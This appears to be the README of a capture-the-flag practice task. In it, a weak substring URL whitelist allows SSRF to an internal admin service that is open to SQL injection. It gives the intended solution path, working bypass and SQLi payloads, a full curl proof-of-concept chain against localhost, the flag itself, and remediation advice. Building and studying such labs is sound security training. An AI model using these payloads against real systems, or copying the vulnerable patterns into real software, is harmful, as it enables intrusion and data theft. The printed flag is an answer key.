# SSRF WebView Whitelist Bypass + Internal SQLi (Easy-Medium)

CTF-jeopardy practice task.

Flag format: `practice{...}`

## Scenario

Public app is a "corporate webview" proxy:

- only logged-in users can access webview API,
- URL is checked by a weak whitelist (`curl.com`, `github.com`),
- backend then fetches URL server-side.

Internal admin service is not exposed publicly and has SQLi in `/admin`.
Player should:

1. log in as regular user,
2. bypass weak whitelist (for example with fragment `#github.com`),
3. reach internal `/admin`,
4. exploit SQLi in `login/password`,
5. get flag from DB.

## Architecture

- `web` (public): `http://localhost:31337`
  - login/logout
  - vulnerable webview endpoint: `POST /api/webview` (alias: `/api/fetch`)
- `internal` (private):
  - no external network (`network_mode: none`)
  - served over unix socket only
  - `/admin?login=...&password=...` has SQL injection
  - SQLite DB stores flag

## Vulnerabilities

### 1) SSRF whitelist bypass

Code: [`web/app.py`](/home/wkp/kosmach/ssrf/web/app.py)

Whitelist check is intentionally weak:

- it only checks whether raw URL string contains allowed substring,
- it does not parse URL safely before allow/deny decision.

So payload like below passes whitelist by fragment:

`http://127.0.0.1/admin/...#github.com`

but request is sent to internal `/admin`.

### 2) SQL injection in internal admin

Code: [`internal/app.py`](/home/wkp/kosmach/ssrf/internal/app.py)

`/admin` builds SQL query via string interpolation:

`WHERE login = '<input>' AND password = '<input>'`

This allows payloads such as:

`admin' OR 1=1-- `

## Run

```bash
docker compose up --build -d
```

Open:

- `http://localhost:31337`

## Credentials for webview

- `player / player123`
- `guest / guest123`

## PoC (full chain -> flag)

### Script

```bash
./poc.sh
```

### Manual curl

1. Login and save session cookie:

```bash
curl -s -L -c cookies.txt \
  -X POST http://localhost:31337/login \
  -d "login=player&password=player123" >/dev/null
```

2. Send SSRF + whitelist bypass + SQLi:

```bash
curl -s -b cookies.txt \
  -X POST http://localhost:31337/api/webview \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1/admin/?login=admin%27%20OR%201%3D1--%20&password=any#github.com"}'
```

Expected output contains:

```text
practice{y3t_3n0th3r_sql1}
```

## Acceptance checklist

- App starts with one command via docker compose.
- Only `web` is public on `31337`.
- Internal service is not directly reachable from host.
- Exploit chain is real and deterministic.
- Flag is taken from DB by exploiting SQLi through SSRF.

## Fixes

1. Require strict URL parser validation (scheme/host/port/path), not substring checks.
2. For SSRF, block localhost/private/link-local/internal targets after DNS resolution.
3. Disallow redirects or re-validate each redirect hop.
4. Use parameterized SQL queries in internal service.
5. Split trust zones and enforce outbound egress policy.
